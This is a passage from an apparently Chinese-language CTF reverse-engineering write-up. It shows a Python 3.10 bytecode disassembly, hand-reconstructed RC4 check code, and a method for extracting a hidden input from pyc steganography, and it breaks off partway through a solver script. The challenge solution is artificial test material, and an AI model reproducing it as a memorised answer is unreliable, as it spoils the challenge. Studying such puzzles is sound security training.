       <span class="number">115</span></span><br><span class="line">        <span class="number">97</span></span><br><span class="line">        <span class="number">117</span></span><br><span class="line">        <span class="number">114</span></span><br><span class="line">        (</span><br><span class="line">            <span class="number">2</span></span><br><span class="line">            <span class="number">8</span></span><br><span class="line">            <span class="number">11</span></span><br><span class="line">            <span class="number">10</span></span><br><span class="line">        )</span><br><span class="line">        <span class="number">119</span></span><br><span class="line">        <span class="number">116</span></span><br><span class="line">        <span class="number">124</span></span><br><span class="line">        <span class="number">127</span></span><br><span class="line">        (</span><br><span class="line">            <span class="number">3</span></span><br><span class="line">            <span class="number">7</span></span><br><span class="line">            <span class="number">9</span></span><br><span class="line">            <span class="number">12</span></span><br><span class="line">        )</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: &lt;dictcomp&gt;</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">2</span></span><br><span class="line">            Stack Size: <span class="number">6</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">&#x27;n&#x27;</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;.0&#x27;</span></span><br><span class="line">                <span class="string">&#x27;x&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       BUILD_MAP               <span class="number">0</span></span><br><span class="line">                <span class="number">2</span>       LOAD_FAST               <span class="number">0</span>: <span class="number">.0</span></span><br><span class="line">                <span class="number">4</span>       FOR_ITER                <span class="number">9</span> (to <span class="number">15</span>)</span><br><span class="line">                <span class="number">6</span>       STORE_FAST              <span class="number">1</span>: x</span><br><span class="line">                <span class="number">8</span>       LOAD_FAST               <span class="number">1</span>: x</span><br><span class="line">                <span class="number">10</span>      LOAD_FAST               <span class="number">1</span>: x</span><br><span class="line">                <span class="number">12</span>      LOAD_GLOBAL             <span class="number">0</span>: n</span><br><span class="line">                <span class="number">14</span>      LOAD_FAST               <span class="number">1</span>: x</span><br><span class="line">                <span class="number">16</span>      BINARY_SUBSCR           </span><br><span class="line">                <span class="number">18</span>      BINARY_XOR              </span><br><span class="line">                <span class="number">20</span>      MAP_ADD                 <span class="number">2</span></span><br><span class="line">                <span class="number">22</span>      JUMP_ABSOLUTE           <span class="number">2</span></span><br><span class="line">                <span class="number">24</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">&#x27;&lt;dictcomp&gt;&#x27;</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: &lt;genexpr&gt;</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">2</span></span><br><span class="line">            Stack Size: <span class="number">3</span></span><br><span class="line">            Flags: <span class="number">0x00000063</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_GENERATOR | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">&#x27;bit_count&#x27;</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;.0&#x27;</span></span><br><span class="line">                <span class="string">&#x27;i&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       &lt;INVALID&gt;               </span><br><span class="line">                <span class="number">2</span>       LOAD_FAST               <span class="number">0</span>: <span class="number">.0</span></span><br><span class="line">                <span class="number">4</span>       FOR_ITER                <span class="number">9</span> (to <span class="number">15</span>)</span><br><span class="line">                <span class="number">6</span>       STORE_FAST              <span class="number">1</span>: i</span><br><span class="line">                <span class="number">8</span>       LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">10</span>      LOAD_METHOD             <span class="number">0</span>: bit_count</span><br><span class="line">                <span class="number">12</span>      CALL_METHOD             <span class="number">0</span></span><br><span class="line">                <span class="number">14</span>      LOAD_FAST               <span class="number">1</span>: i</span><br><span class="line">                <span class="number">16</span>      BUILD_TUPLE             <span class="number">2</span></span><br><span class="line">                <span class="number">18</span>      YIELD_VALUE             </span><br><span class="line">                <span class="number">20</span>      POP_TOP                 </span><br><span class="line">                <span class="number">22</span>      JUMP_ABSOLUTE           <span class="number">2</span></span><br><span class="line">                <span class="number">24</span>      LOAD_CONST              <span class="number">0</span>: <span class="literal">None</span></span><br><span class="line">                <span class="number">26</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">&#x27;&lt;genexpr&gt;&#x27;</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: main.py</span><br><span class="line">            Object Name: &lt;<span class="keyword">lambda</span>&gt;</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            Pos Only Arg Count: <span class="number">0</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">1</span></span><br><span class="line">            Stack Size: <span class="number">2</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">&#x27;x&#x27;</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">1</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_FAST               <span class="number">0</span>: x</span><br><span class="line">                <span class="number">2</span>       LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">4</span>       BINARY_SUBSCR           </span><br><span class="line">                <span class="number">6</span>       RETURN_VALUE            </span><br><span class="line">        <span class="string">&#x27;&lt;lambda&gt;&#x27;</span></span><br><span class="line">    [Disassembly]</span><br><span class="line">        <span class="number">0</span>       LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">2</span>       LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">4</span>       IMPORT_NAME             <span class="number">0</span>: sys</span><br><span class="line">        <span class="number">6</span>       STORE_NAME              <span class="number">0</span>: sys</span><br><span class="line">        <span class="number">8</span>       LOAD_CONST              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">        <span class="number">10</span>      LOAD_CONST              <span class="number">2</span>: (<span class="string">&#x27;sha256&#x27;</span>,)</span><br><span class="line">        <span class="number">12</span>      IMPORT_NAME             <span class="number">1</span>: hashlib</span><br><span class="line">        <span class="number">14</span>      IMPORT_FROM             <span class="number">2</span>: sha256</span><br><span class="line">        <span class="number">16</span>      STORE_NAME              <span class="number">2</span>: sha256</span><br><span class="line">        <span class="number">18</span>      POP_TOP                 </span><br><span class="line">        <span class="number">20</span>      LOAD_CONST              <span class="number">3</span>: &lt;CODE&gt; KSA</span><br><span class="line">        <span class="number">22</span>      LOAD_CONST              <span class="number">4</span>: <span class="string">&#x27;KSA&#x27;</span></span><br><span class="line">        <span class="number">24</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">26</span>      STORE_NAME              <span class="number">3</span>: KSA</span><br><span class="line">        <span class="number">28</span>      LOAD_CONST              <span class="number">5</span>: &lt;CODE&gt; PRGA</span><br><span class="line">        <span class="number">30</span>      LOAD_CONST              <span class="number">6</span>: <span class="string">&#x27;PRGA&#x27;</span></span><br><span class="line">        <span class="number">32</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">34</span>      STORE_NAME              <span class="number">4</span>: PRGA</span><br><span class="line">        <span class="number">36</span>      LOAD_CONST              <span class="number">7</span>: &lt;CODE&gt; RC4</span><br><span class="line">        <span class="number">38</span>      LOAD_CONST              <span class="number">8</span>: <span class="string">&#x27;RC4&#x27;</span></span><br><span class="line">        <span class="number">40</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">42</span>      STORE_NAME              <span class="number">5</span>: RC4</span><br><span class="line">        <span class="number">44</span>      LOAD_CONST              <span class="number">9</span>: &lt;CODE&gt; xor</span><br><span class="line">        <span class="number">46</span>      LOAD_CONST              <span class="number">10</span>: <span class="string">&#x27;xor&#x27;</span></span><br><span class="line">        <span class="number">48</span>      MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">50</span>      STORE_NAME              <span class="number">6</span>: xor</span><br><span class="line">        <span class="number">52</span>      LOAD_NAME               <span class="number">7</span>: __name__</span><br><span class="line">        <span class="number">54</span>      LOAD_CONST              <span class="number">11</span>: <span class="string">&#x27;__main__&#x27;</span></span><br><span class="line">        <span class="number">56</span>      COMPARE_OP              <span class="number">2</span> (==)</span><br><span class="line">        <span class="number">58</span>      POP_JUMP_IF_FALSE       <span class="number">139</span></span><br><span class="line">        <span class="number">60</span>      LOAD_CONST              <span class="number">12</span>: <span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">        <span class="number">62</span>      STORE_NAME              <span class="number">8</span>: w</span><br><span class="line">        <span class="number">64</span>      LOAD_CONST              <span class="number">13</span>: <span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">        <span class="number">66</span>      STORE_NAME              <span class="number">9</span>: e</span><br><span class="line">        <span class="number">68</span>      LOAD_CONST              <span class="number">14</span>: <span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">        <span class="number">70</span>      STORE_NAME              <span class="number">10</span>: b</span><br><span class="line">        <span class="number">72</span>      LOAD_CONST              <span class="number">15</span>: <span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">        <span class="number">74</span>      STORE_NAME              <span class="number">11</span>: s</span><br><span class="line">        <span class="number">76</span>      LOAD_CONST              <span class="number">16</span>: <span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line">        <span class="number">78</span>      STORE_NAME              <span class="number">12</span>: t</span><br><span class="line">        <span class="number">80</span>      LOAD_CONST              <span class="number">17</span>: <span class="number">115</span></span><br><span class="line">        <span class="number">82</span>      LOAD_CONST              <span class="number">18</span>: <span class="number">97</span></span><br><span class="line">        <span class="number">84</span>      LOAD_CONST              <span class="number">19</span>: <span class="number">117</span></span><br><span class="line">        <span class="number">86</span>      LOAD_CONST              <span class="number">20</span>: <span class="number">114</span></span><br><span class="line">        <span class="number">88</span>      LOAD_CONST              <span class="number">21</span>: (<span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">10</span>)</span><br><span class="line">        <span class="number">90</span>      BUILD_CONST_KEY_MAP     <span class="number">4</span></span><br><span class="line">        <span class="number">92</span>      STORE_NAME              <span class="number">13</span>: m</span><br><span class="line">        <span class="number">94</span>      LOAD_CONST              <span class="number">22</span>: <span class="number">119</span></span><br><span class="line">        <span class="number">96</span>      LOAD_CONST              <span class="number">23</span>: <span class="number">116</span></span><br><span class="line">        <span class="number">98</span>      LOAD_CONST              <span class="number">24</span>: <span class="number">124</span></span><br><span class="line">        <span class="number">100</span>     LOAD_CONST              <span class="number">25</span>: <span class="number">127</span></span><br><span class="line">        <span class="number">102</span>     LOAD_CONST              <span class="number">26</span>: (<span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">12</span>)</span><br><span class="line">        <span class="number">104</span>     BUILD_CONST_KEY_MAP     <span class="number">4</span></span><br><span class="line">        <span class="number">106</span>     STORE_NAME              <span class="number">14</span>: n</span><br><span class="line">        <span class="number">108</span>     LOAD_NAME               <span class="number">13</span>: m</span><br><span class="line">        <span class="number">110</span>     LOAD_CONST              <span class="number">27</span>: &lt;CODE&gt; &lt;dictcomp&gt;</span><br><span class="line">        <span class="number">112</span>     LOAD_CONST              <span class="number">28</span>: <span class="string">&#x27;&lt;dictcomp&gt;&#x27;</span></span><br><span class="line">        <span class="number">114</span>     MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">116</span>     LOAD_NAME               <span class="number">14</span>: n</span><br><span class="line">        <span class="number">118</span>     GET_ITER                </span><br><span class="line">        <span class="number">120</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">122</span>     INPLACE_OR              </span><br><span class="line">        <span class="number">124</span>     STORE_NAME              <span class="number">13</span>: m</span><br><span class="line">        <span class="number">126</span>     LOAD_NAME               <span class="number">13</span>: m</span><br><span class="line">        <span class="number">128</span>     LOAD_CONST              <span class="number">29</span>: &lt;CODE&gt; &lt;genexpr&gt;</span><br><span class="line">        <span class="number">130</span>     LOAD_CONST              <span class="number">30</span>: <span class="string">&#x27;&lt;genexpr&gt;&#x27;</span></span><br><span class="line">        <span class="number">132</span>     MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">134</span>     LOAD_NAME               <span class="number">10</span>: b</span><br><span class="line">        <span class="number">136</span>     GET_ITER                </span><br><span class="line">        <span class="number">138</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">140</span>     INPLACE_OR              </span><br><span class="line">        <span class="number">142</span>     STORE_NAME              <span class="number">13</span>: m</span><br><span class="line">        <span class="number">144</span>     LOAD_NAME               <span class="number">5</span>: RC4</span><br><span class="line">        <span class="number">146</span>     LOAD_NAME               <span class="number">15</span>: <span class="built_in">list</span></span><br><span class="line">        <span class="number">148</span>     LOAD_NAME               <span class="number">16</span>: <span class="built_in">map</span></span><br><span class="line">        <span class="number">150</span>     LOAD_CONST              <span class="number">31</span>: &lt;CODE&gt; &lt;<span class="keyword">lambda</span>&gt;</span><br><span class="line">        <span class="number">152</span>     LOAD_CONST              <span class="number">32</span>: <span class="string">&#x27;&lt;lambda&gt;&#x27;</span></span><br><span class="line">        <span class="number">154</span>     MAKE_FUNCTION           <span class="number">0</span></span><br><span class="line">        <span class="number">156</span>     LOAD_NAME               <span class="number">17</span>: <span class="built_in">sorted</span></span><br><span class="line">        <span class="number">158</span>     LOAD_NAME               <span class="number">13</span>: m</span><br><span class="line">        <span class="number">160</span>     LOAD_METHOD             <span class="number">18</span>: items</span><br><span class="line">        <span class="number">162</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">164</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">166</span>     CALL_FUNCTION           <span class="number">2</span></span><br><span class="line">        <span class="number">168</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">170</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">172</span>     STORE_NAME              <span class="number">19</span>: stream</span><br><span class="line">        <span class="number">174</span>     LOAD_NAME               <span class="number">20</span>: <span class="built_in">print</span></span><br><span class="line">        <span class="number">176</span>     LOAD_NAME               <span class="number">6</span>: xor</span><br><span class="line">        <span class="number">178</span>     LOAD_NAME               <span class="number">8</span>: w</span><br><span class="line">        <span class="number">180</span>     LOAD_NAME               <span class="number">19</span>: stream</span><br><span class="line">        <span class="number">182</span>     CALL_FUNCTION           <span class="number">2</span></span><br><span class="line">        <span class="number">184</span>     LOAD_METHOD             <span class="number">21</span>: decode</span><br><span class="line">        <span class="number">186</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">188</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">190</span>     POP_TOP                 </span><br><span class="line">        <span class="number">192</span>     LOAD_NAME               <span class="number">0</span>: sys</span><br><span class="line">        <span class="number">194</span>     LOAD_ATTR               <span class="number">22</span>: stdin</span><br><span class="line">        <span class="number">196</span>     LOAD_ATTR               <span class="number">23</span>: buffer</span><br><span class="line">        <span class="number">198</span>     LOAD_METHOD             <span class="number">24</span>: read</span><br><span class="line">        <span class="number">200</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">202</span>     STORE_NAME              <span class="number">25</span>: p</span><br><span class="line">        <span class="number">204</span>     LOAD_NAME               <span class="number">6</span>: xor</span><br><span class="line">        <span class="number">206</span>     LOAD_NAME               <span class="number">9</span>: e</span><br><span class="line">        <span class="number">208</span>     LOAD_NAME               <span class="number">19</span>: stream</span><br><span class="line">        <span class="number">210</span>     CALL_FUNCTION           <span class="number">2</span></span><br><span class="line">        <span class="number">212</span>     STORE_NAME              <span class="number">9</span>: e</span><br><span class="line">        <span class="number">214</span>     LOAD_NAME               <span class="number">6</span>: xor</span><br><span class="line">        <span class="number">216</span>     LOAD_NAME               <span class="number">25</span>: p</span><br><span class="line">        <span class="number">218</span>     LOAD_NAME               <span class="number">19</span>: stream</span><br><span class="line">        <span class="number">220</span>     CALL_FUNCTION           <span class="number">2</span></span><br><span class="line">        <span class="number">222</span>     STORE_NAME              <span class="number">26</span>: c</span><br><span class="line">        <span class="number">224</span>     LOAD_NAME               <span class="number">2</span>: sha256</span><br><span class="line">        <span class="number">226</span>     LOAD_NAME               <span class="number">26</span>: c</span><br><span class="line">        <span class="number">228</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">230</span>     LOAD_METHOD             <span class="number">27</span>: digest</span><br><span class="line">        <span class="number">232</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">234</span>     LOAD_NAME               <span class="number">11</span>: s</span><br><span class="line">        <span class="number">236</span>     COMPARE_OP              <span class="number">2</span> (==)</span><br><span class="line">        <span class="number">238</span>     POP_JUMP_IF_FALSE       <span class="number">131</span></span><br><span class="line">        <span class="number">240</span>     LOAD_NAME               <span class="number">20</span>: <span class="built_in">print</span></span><br><span class="line">        <span class="number">242</span>     LOAD_NAME               <span class="number">6</span>: xor</span><br><span class="line">        <span class="number">244</span>     LOAD_NAME               <span class="number">12</span>: t</span><br><span class="line">        <span class="number">246</span>     LOAD_NAME               <span class="number">19</span>: stream</span><br><span class="line">        <span class="number">248</span>     CALL_FUNCTION           <span class="number">2</span></span><br><span class="line">        <span class="number">250</span>     LOAD_METHOD             <span class="number">21</span>: decode</span><br><span class="line">        <span class="number">252</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">254</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">256</span>     POP_TOP                 </span><br><span class="line">        <span class="number">258</span>     LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">260</span>     RETURN_VALUE            </span><br><span class="line">        <span class="number">262</span>     LOAD_NAME               <span class="number">20</span>: <span class="built_in">print</span></span><br><span class="line">        <span class="number">264</span>     LOAD_NAME               <span class="number">9</span>: e</span><br><span class="line">        <span class="number">266</span>     LOAD_METHOD             <span class="number">21</span>: decode</span><br><span class="line">        <span class="number">268</span>     CALL_METHOD             <span class="number">0</span></span><br><span class="line">        <span class="number">270</span>     CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">        <span class="number">272</span>     POP_TOP                 </span><br><span class="line">        <span class="number">274</span>     LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">276</span>     RETURN_VALUE            </span><br><span class="line">        <span class="number">278</span>     LOAD_CONST              <span class="number">1</span>: <span class="literal">None</span></span><br><span class="line">        <span class="number">280</span>     RETURN_VALUE            </span><br></pre></td></tr></table></figure><p>看到行数不算太多，而且有很多都是赋值操作，比较容易逆，干脆直接手逆出源码</p><p>逆出来的<code>main.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KSA</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength=<span class="built_in">len</span>(key)</span><br><span class="line">    S=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j=(S[i]+j+key[i%keylength])%<span class="number">256</span></span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PRGA</span>(<span class="params">S</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">        j=(j+S[i])%<span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">        K=S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RC4</span>(<span class="params">key</span>):</span></span><br><span class="line">    S=KSA(key)</span><br><span class="line">    <span class="keyword">return</span> PRGA(S)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p,stream</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x^stream.__next__(),p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    w=<span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">    e=<span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">    b=<span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">    s=<span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">    t=<span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line">    m=&#123;<span class="number">2</span>:<span class="number">115</span>,<span class="number">8</span>:<span class="number">97</span>,<span class="number">11</span>:<span class="number">117</span>,<span class="number">10</span>:<span class="number">114</span>&#125;</span><br><span class="line">    n=&#123;<span class="number">3</span>:<span class="number">119</span>,<span class="number">7</span>:<span class="number">116</span>,<span class="number">9</span>:<span class="number">124</span>,<span class="number">12</span>:<span class="number">127</span>&#125;</span><br><span class="line">    m|=&#123;x:x^n[x] <span class="keyword">for</span> x <span class="keyword">in</span> n&#125;</span><br><span class="line">    m|=((i.bit_count(),i) <span class="keyword">for</span> i <span class="keyword">in</span> b)</span><br><span class="line">    stream=RC4(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x[<span class="number">1</span>],<span class="built_in">sorted</span>(m.items()))))</span><br><span class="line">    print(xor(w,stream).decode())</span><br><span class="line">    p=sys.stdin.buffer.read()</span><br><span class="line">    e=xor(e,stream)</span><br><span class="line">    c=xor(p,stream)</span><br><span class="line">    <span class="keyword">if</span> sha256(c).digest()==s:</span><br><span class="line">        print(xor(t,stream).decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(e.decode())</span><br></pre></td></tr></table></figure><p>逆的过程中发现<code>bit_count()</code>是python 3.10的新方法，一查才发现<code>6f 0d 0d 0a</code>是3.10版本的魔数（还以为第一字节被魔改了x</p><p>这里python文件的逻辑是用m、n、b生成了一个key，给rc4初始化密钥流，然后xor加密数据（其实就是把rc4加密拆开了），最后验证密文的sha256值是否等于所给的值即可。</p><p>由于yield的特性，我们可以爆破出p是26位（其他长度的输入都不能正常输出<code>xor(t,stream).decode()</code>）</p><h3 id="pyc隐写"><a href="#pyc隐写" class="headerlink" title="pyc隐写"></a>pyc隐写</h3><p>爆破sha256显然是不可行的，于是猜测到有pyc隐写，把key打印出来也能看到有提示：</p><p><img src="/p/wpFor-2021qwb/image-20210712161834340.png"></p><p>stegosaurus是一个pyc隐写工具（<a href="https://github.com/AngelKitty/stegosaurus">AngelKitty&#x2F;stegosaurus: A steganography tool for embedding payloads within Python bytecode.</a>），拿工具来用发现又报错，查了一下发现是工具不兼容高版本的问题。</p><p>研究了一下这个工具的隐写原理，然后直接手抠隐写payload（</p><p>用自己逆出来的<code>main.py</code>生成pyc文件，来跟题目提出来的pyc文件在010里做对比，题目中有值且自己的pyc文件中为00的部分很大可能是隐写的字节，比如这种：（其他以此类推）</p><p><img src="/p/wpFor-2021qwb/image-20210614153719020.png"></p><p>拿到一串乱序的payload：<code>b&#39;\xf0\xb4\x55\x16\x36\xc5\x6f\xdb\xc9\xea\x64\x04\x15\x62\x11\xa2\xb0\xcd\xf0\x7d\x49\x32\xd6\x22\xe5\x0a&#39;</code></p><p>因为顺序问题无从下手，只好用stegosaurus工具自己生成了一个隐写版本的两个pyc做对比，为了方便看顺序，payload设置成<code>”ABCDEFGHIJKLMNOPQRSTUVWXYZ“</code>：</p><p><img src="/p/wpFor-2021qwb/image-20210614154407137.png"></p><p>拿到两个pyc文件，很容易就对比出这26个字母的顺序，比如：</p><p><img src="/p/wpFor-2021qwb/image-20210614154535502.png"></p><p>最后拿到顺序</p><p><img src="/p/wpFor-2021qwb/JGATlWI6gFH6olgC2VBnvQ.jpg" alt="img"></p><p>按顺序排列payload填入p中，由rc4的特性加密和解密流程相同，所以可以直接拿源码改出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KSA</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength=<span class="built_in">len</span>(key)</span><br><span class="line">    S=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j=(S[i]+j+key[i%keylength])%<span class="number">256</span></span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 